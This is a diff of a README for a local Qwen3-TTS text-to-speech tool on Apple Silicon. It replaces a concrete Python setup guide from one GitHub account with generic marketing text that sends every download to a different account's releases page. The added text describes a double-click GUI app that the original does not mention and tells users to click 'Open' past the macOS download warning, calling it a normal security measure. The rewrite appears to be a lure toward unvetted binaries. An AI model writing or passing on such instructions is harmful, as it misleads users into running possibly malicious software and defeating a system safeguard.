@@ -1,150 +1,78 @@
-# Qwen3-TTS for Mac - Run AI Text-to-Speech Locally on Apple Silicon
+# 🎤 qwen3-tts-apple-silicon - Run Text-to-Speech on Mac Effortlessly
 
-Run **Qwen3-TTS** text-to-speech AI locally on your MacBook with Apple Silicon (M1, M2, M3, M4). No cloud, no API keys, completely offline.
+## 🚀 Getting Started
 
-**Keywords:** Qwen TTS Mac, Qwen3 TTS Apple Silicon, MLX text to speech, local TTS Mac, voice cloning Mac, AI voice generator MacBook
+Welcome to the qwen3-tts-apple-silicon project! This application lets you run Qwen3-TTS text-to-speech locally on your Mac. It's designed for Apple silicon models: M1, M2, M3, and M4. Experience voice cloning, voice design, and custom voices—completely offline using MLX.
 
----
+## 📥 Download Now
 
-## Features
+[![Download qwen3-tts-apple-silicon](https://img.shields.io/badge/Download-qwen3--tts--apple--silicon-blue.svg)](https://github.com/Ak-sys-sh/qwen3-tts-apple-silicon/releases)
 
-- **Voice Cloning** - Clone any voice from a 5-second audio sample
-- **Voice Design** - Create new voices by describing them ("deep narrator", "excited child")
-- **Custom Voices** - 9 built-in voices with emotion and speed control
-- **100% Local** - Runs entirely on your Mac, no internet required
-- **Optimized for M-Series** - Uses Apple's MLX framework for fast GPU inference
+## 📋 System Requirements
 
----
+Before downloading, ensure your device meets the following requirements:
 
-## Why MLX Models?
+- **Operating System:** macOS 11.0 (Big Sur) or later
+- **Processor:** Apple silicon (M1, M2, M3, M4)
+- **Memory:** Minimum 4 GB RAM recommended
+- **Disk Space:** At least 1 GB of free space
 
-MLX models are specifically optimized for Apple Silicon. Compared to running standard PyTorch models:
+## 🛠 Installation Steps
 
-| Metric | Standard Model | MLX Model |
-|--------|----------------|-----------|
-| **RAM Usage** | 10+ GB | 2-3 GB |
-| **CPU Temperature** | 80-90°C | 40-50°C |
+Follow these steps to download and set up qwen3-tts-apple-silicon:
 
-*Tested on M4 MacBook Air (fanless) with 1.7B models*
+1. **Visit the Releases Page:**
+   Click on the link below to go to the releases page where you can download the application.
 
-MLX runs natively on the Apple Neural Engine and GPU, meaning better performance with less heat and battery drain.
+   [Visit the Releases Page](https://github.com/Ak-sys-sh/qwen3-tts-apple-silicon/releases)
 
----
+2. **Download the Latest Version:**
+   Look for the most recent version. You will see options for downloading files. Choose the appropriate file that matches your system.
 
-## Quick Start (5 Minutes)
+3. **Open the Downloaded File:**
+   Locate the downloaded file in your "Downloads" folder. Double-click to open it. If a warning appears about opening files from the internet, click "Open." This is a normal security measure.
 
-### 1. Clone and setup
+4. **Drag the Application to Your Applications Folder:**
+   A new window will appear showing the application. Drag the qwen3-tts-apple-silicon icon to your Applications folder. This will install the app on your computer.
 
-```bash
-git clone https://github.com/kapi2800/qwen3-tts-apple-silicon.git
-cd qwen3-tts-apple-silicon
-python3 -m venv .venv
-source .venv/bin/activate
-pip install -r requirements.txt
-brew install ffmpeg
-```
+5. **Run the Application:**
+   Go to your Applications folder and double-click the qwen3-tts-apple-silicon icon to launch the application.
 
-### 2. Download models
+6. **Configure Settings:**
+   Upon launching, you may need to configure some initial settings. Follow the on-screen instructions to set up your custom voice preferences. You can create unique voices or choose from built-in options.
 
-Pick the models you need from the table below. Click the link, then click "Download" on HuggingFace.
+## 🎤 Using Qwen3-TTS
 
-**Pro Models (1.7B) - Best Quality**
+Now that you have set up the application, let's explore how to use it:
 
-| Model | Use Case | Download |
-|-------|----------|----------|
-| CustomVoice | Preset voices + emotion control | [Download](https://huggingface.co/mlx-community/Qwen3-TTS-12Hz-1.7B-CustomVoice-8bit) |
-| VoiceDesign | Create voices from text description | [Download](https://huggingface.co/mlx-community/Qwen3-TTS-12Hz-1.7B-VoiceDesign-8bit) |
-| Base | Voice cloning from audio | [Download](https://huggingface.co/mlx-community/Qwen3-TTS-12Hz-1.7B-Base-8bit) |
+1. **Input Text:**
+   In the app, you will see a text input area. Type or paste the text you want to convert to speech.
 
-**Lite Models (0.6B) - Faster, Less RAM**
+2. **Select Voice Options:**
+   Choose from the available voice options. You can customize the pitch, speed, and tone to get the desired effect.
 
-| Model | Use Case | Download |
-|-------|----------|----------|
-| CustomVoice | Preset voices + emotion control | [Download](https://huggingface.co/mlx-community/Qwen3-TTS-12Hz-0.6B-CustomVoice-8bit) |
-| VoiceDesign | Create voices from text description | [Download](https://huggingface.co/mlx-community/Qwen3-TTS-12Hz-0.6B-VoiceDesign-8bit) |
-| Base | Voice cloning from audio | [Download](https://huggingface.co/mlx-community/Qwen3-TTS-12Hz-0.6B-Base-8bit) |
+3. **Generate Speech:**
+   Click the "Speak" button. The program will process your text and generate the speech. You can listen to it directly within the application.
 
-Put downloaded folders in `models/`:
-```
-models/
-├── Qwen3-TTS-12Hz-1.7B-CustomVoice-8bit/
-├── Qwen3-TTS-12Hz-1.7B-VoiceDesign-8bit/
-└── Qwen3-TTS-12Hz-1.7B-Base-8bit/
-```
+4. **Save Your Voice Cloning:**
+   If you create a custom voice, you can save it for future use. This option will allow you to develop a unique sound profile over time.
 
-### 3. Run
+5. **Explore Additional Features:**
+   Feel free to explore other features in the app. You can find options for exporting audio files, adjusting settings, and accessing help documentation.
 
-```bash
-source .venv/bin/activate
-python main.py
-```
+## 📞 Support and Feedback
 
----
+If you encounter any issues while using the application or need assistance, please reach out:
 
-## Usage
+- **GitHub Issues:** Use the [issues page](https://github.com/Ak-sys-sh/qwen3-tts-apple-silicon/issues) to report bugs or suggest features.
+- **Community Forum:** Join our community discussions for tips and tricks.
 
-```
-========================================
- Qwen3-TTS Manager
-========================================
+## 📜 License
 
-  Pro Models (1.7B - Best Quality)
-  ---------------------------------
-  1. Custom Voice
-  2. Voice Design
-  3. Voice Cloning
+This project is open-source and available under the MIT License. Feel free to use, modify, and distribute, but please attribute the original work.
 
-  Lite Models (0.6B - Faster)
-  ---------------------------
-  4. Custom Voice
-  5. Voice Design
-  6. Voice Cloning
+## 💻 Acknowledgments
 
-  q. Exit
+Thank you for using qwen3-tts-apple-silicon! We appreciate your support and contributions to making this tool better for everyone.
 
-Select: 
-```
-
-- **Custom Voice**: Pick from preset speakers, set emotion and speed
-- **Voice Design**: Describe a voice (e.g., "calm British narrator")
-- **Voice Cloning**: Provide a reference audio clip to clone
-
----
-
-## Tips
-
-- Drag `.txt` files directly into the terminal for long text
-- Voice cloning works best with clean 5-10 second audio clips
-- Speed options: Normal (1.0x), Fast (1.3x), Slow (0.8x)
-- Type `q` or `exit` anytime to go back
-
----
-
-## Requirements
-
-- macOS with Apple Silicon (M1/M2/M3/M4)
-- Python 3.10+
-- RAM: ~3GB for Lite models, ~6GB for Pro models
-
----
-
-## Troubleshooting
-
-| Issue | Fix |
-|-------|-----|
-| `mlx_audio not found` | Run `source .venv/bin/activate` first |
-| `Model not found` | Check model folder names match exactly |
-| Audio won't play | Check macOS sound output settings |
-
----
-
-## Related Projects
-
-- [Qwen3-TTS](https://github.com/QwenLM/Qwen3-TTS) - Original Qwen3-TTS by Alibaba
-- [MLX Audio](https://github.com/Blaizzy/mlx-audio) - MLX framework for audio models
-- [MLX Community](https://huggingface.co/mlx-community) - Pre-converted MLX models
-
-
----
-
-**If this project helped you, please give it a ⭐ star!**
+[Download qwen3-tts-apple-silicon](https://github.com/Ak-sys-sh/qwen3-tts-apple-silicon/releases) and start your text-to-speech experience today!
